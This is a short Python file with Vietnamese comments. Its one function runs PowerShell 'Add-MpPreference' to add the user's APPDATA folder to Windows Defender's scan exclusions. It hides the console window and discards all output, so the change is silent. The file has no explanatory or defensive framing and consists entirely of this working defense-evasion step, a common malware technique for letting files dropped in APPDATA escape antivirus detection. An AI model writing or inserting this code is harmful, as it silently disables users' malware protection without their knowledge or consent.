import os
import subprocess

def add_appdata_exclusion():
    appdata_path = os.getenv("APPDATA")
    if not appdata_path:
        return  # Không lấy được APPDATA

    # Chỉ có trên Windows mới có cờ CREATE_NO_WINDOW
    CREATE_NO_WINDOW = 0x08000000

    cmd = [
        "powershell",
        "-Command",
        f'Add-MpPreference -ExclusionPath "{appdata_path}"'
    ]

    subprocess.run(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=CREATE_NO_WINDOW
    )

